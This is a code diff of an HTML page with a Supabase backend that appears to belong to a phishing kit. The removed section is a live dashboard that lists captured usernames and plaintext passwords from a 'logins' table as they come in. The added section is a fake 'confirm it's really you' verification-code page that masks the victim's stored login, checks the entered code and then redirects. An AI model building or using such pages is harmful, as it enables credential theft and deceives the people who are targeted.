@@ -115,51 +115,83 @@
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
-  <script>
-    const SUPABASE_URL = 'https://YOUR_PROJECT.supabase.co';
-    const SUPABASE_ANON_KEY = 'YOUR_SUPABASE_ANON_KEY';
+ <script>
+  // Supabase setup
+  const SUPABASE_URL = 'https://scserlwosxrmnvomipxt.supabase.co';
+  const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'; // use your full anon key
+  const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-    const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+  window.onload = function () {
+    const user = localStorage.getItem("login_user");
+    const msgEl = document.getElementById("confirmation-msg");
 
-    async function fetchLogins() {
-      const { data, error } = await supabase
-        .from('logins')
-        .select('username, password')
-        .order('id', { ascending: false });
-
-      if (error) {
-        console.error('Error fetching logins:', error);
-        return;
-      }
-
-      const tableBody = document.getElementById('logins-table-body');
-      tableBody.innerHTML = '';
-
-      data.forEach(entry => {
-        const row = document.createElement('tr');
-        row.innerHTML = `
-          <td>${entry.username}</td>
-          <td>${entry.password}</td>
-        `;
-        tableBody.appendChild(row);
-      });
+    if (!user) {
+      msgEl.textContent =
+        "To confirm it's really you trying to log in, we sent a code to your account. Enter it below to continue.";
+      return;
     }
 
-    // Real-time listener
-    supabase
-      .channel('realtime:logins')
-      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'logins' }, payload => {
-        const entry = payload.new;
-        const row = document.createElement('tr');
-        row.innerHTML = `
-          <td>${entry.username}</td>
-          <td>${entry.password}</td>
-        `;
-        document.getElementById('logins-table-body').prepend(row);
-      })
-      .subscribe();
+    let displayType = "account";
+    let ending = "";
 
-    fetchLogins();
-  </script>
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+    if (emailRegex.test(user)) {
+      displayType = "email";
+      const atIndex = user.indexOf("@");
+      ending = user.slice(atIndex);
+    } else if (/^\d{7,}$/.test(user)) {
+      displayType = "phone number";
+      ending = user.slice(-4);
+    } else {
+      displayType = "username";
+      ending = user.length > 4 ? user.slice(-4) : user;
+    }
+
+    msgEl.textContent = `To confirm it's really you trying to log in, we sent a code to your ${displayType} ending in ....${ending}. Enter it below to continue.`;
+  };
+
+  async function verifyCode() {
+    const codeInput = document.getElementById("code-input");
+    const code = codeInput.value.trim();
+
+    // Remove previous error state
+    const existingError = document.querySelector(".error-message");
+    if (existingError) existingError.remove();
+    codeInput.style.borderColor = "#ccc";
+
+    if (!code) {
+      codeInput.style.borderColor = "red";
+
+      const error = document.createElement("div");
+      error.className = "error-message";
+      error.textContent = "Required";
+      error.style.color = "red";
+      error.style.fontSize = "12px";
+      error.style.marginTop = "-15px";
+      error.style.marginBottom = "15px";
+      codeInput.parentNode.insertBefore(error, codeInput.nextSibling);
+
+      return;
+    }
+
+    try {
+      const { data, error } = await supabase
+        .from("codes") // table name
+        .select("*")
+        .eq("code", code) // column name
+        .single();
+
+      if (error || !data) {
+        alert("Incorrect code. Please try again.");
+      } else {
+        window.location.href = "homepage.html";
+      }
+    } catch (err) {
+      alert("An error occurred. Please try again.");
+    }
+  }
+</script>
+
 </body>
 </html>
